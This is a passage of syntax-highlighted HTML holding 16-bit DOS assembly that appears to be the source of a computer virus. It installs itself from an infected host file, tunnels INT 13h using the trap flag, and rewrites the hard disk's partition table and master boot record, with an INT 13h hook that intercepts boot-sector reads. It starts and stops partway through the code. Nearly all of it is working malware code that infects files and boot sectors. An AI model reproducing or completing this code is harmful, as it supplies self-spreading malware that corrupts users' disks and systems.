   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">046</span><span class="sc0">
   </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">091B</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0A04</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">045</span><span class="sc0">
   </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">CLI</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">070</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc2">084</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B4</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09B6</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">070</span><span class="sc4">],</span><span class="sc2">044F</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">072</span><span class="sc4">],</span><span class="sc8">DS</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">STI</span><span class="sc0">
   </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc5">INSTALL</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">NEXT_LINE</span><span class="sc0">
 </span><span class="sc5">NEXT_LINE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">028F</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FE02</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">01FD</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc5">NO_PARTITION_INFECTION</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc2">05A</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_PARTITION_INFECTION</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0BB</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc5">NO_PARTITION_INFECTION</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">012</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0BB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INFECT_PARTITION_TABLE</span><span class="sc0">
 </span><span class="sc5">NO_PARTITION_INFECTION</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
 </span><span class="sc5">CHAIN_TO_THE_HOST_FILE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">

</span><span class="sc5">INFECT_PARTITION_TABLE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02A</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">052</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">03E8</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">03513</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">03501</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">02501</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">03DA</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">080</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FEFF</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">02501</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
   </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">021</span><span class="sc0">
   </span><span class="sc6">POPF</span><span class="sc0">
   </span><span class="sc6">JAE</span><span class="sc0"> </span><span class="sc2">0450</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02E</span><span class="sc4">],</span><span class="sc2">0FE02</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">045C</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">01BE</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0479</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0479</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0479</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">010</span><span class="sc0">
   </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc2">0463</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">080</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc5">B</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0228</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">03F</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">JBE</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">0226</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0C</span><span class="sc4">],</span><span class="sc8">SI</span><span class="sc0">
   </span><span class="sc6">SBB</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0305</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">01F6</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">034</span><span class="sc0">
   </span><span class="sc6">CLD</span><span class="sc0">
   </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">09A4</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DH</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">D</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">NEW_INTERRUPT_ONE</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0506</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">09B4</span><span class="sc0">
   </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc2">050B</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">LES</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A0</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc2">09A2</span><span class="sc4">],</span><span class="sc8">ES</span><span class="sc0">        </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc8">CS</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">B</span><span class="sc4">[</span><span class="sc2">0A</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc5">W</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0FEFF</span><span class="sc0">
   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc0">
   </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">NEW_INTERRUPT_13</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">054E</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">080</span><span class="sc0">
   </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc2">054E</span><span class="sc0">         </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">JA</span><span class="sc0"> </span><span class="sc2">054E</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc6">JB</span><span class="sc0"> </span><span class="sc2">054E</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
   </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
   </span><span class="sc6">JE</span><span class="sc0"> </span><span class="sc2">0537</span><span class="sc0">          </span><span class="sc1">;Masm Mod. Needed</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
   </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0200</span><span class="sc0">
   </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
   </span><span class="sc6">PUSHF</span><span class="sc0">
